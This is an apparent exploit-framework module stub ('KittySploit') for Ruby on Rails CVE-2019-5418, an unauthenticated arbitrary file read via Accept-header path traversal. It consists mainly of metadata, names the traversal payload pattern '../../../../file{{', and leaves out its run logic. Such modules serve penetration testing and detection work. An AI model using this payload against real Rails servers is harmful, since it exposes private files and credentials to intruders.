#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Rails Accept-header arbitrary file read (CVE-2019-5418)."""
...
class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'Ruby on Rails - Accept Header File Read (CVE-2019-5418)',
        'description': (
            'Reads arbitrary files via CVE-2019-5418 Accept-header path traversal '
            '(../../../../file{{).'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2019-5418'],
        'platform': Platform.MULTI,
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2019-5418'],
        'tags': ['rails', 'lfi', 'file-read', 'unauth', 'kev', 'cve-2019-5418'],
        'agent': {
            'risk': 'intrusive',
            ...
            'chain': {
                ...
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2019_5418_detect'],
            },
        },
    }
    ...
    def run(self):
        ...
        print_status(f'Reading {target} via Rails Accept header ...')
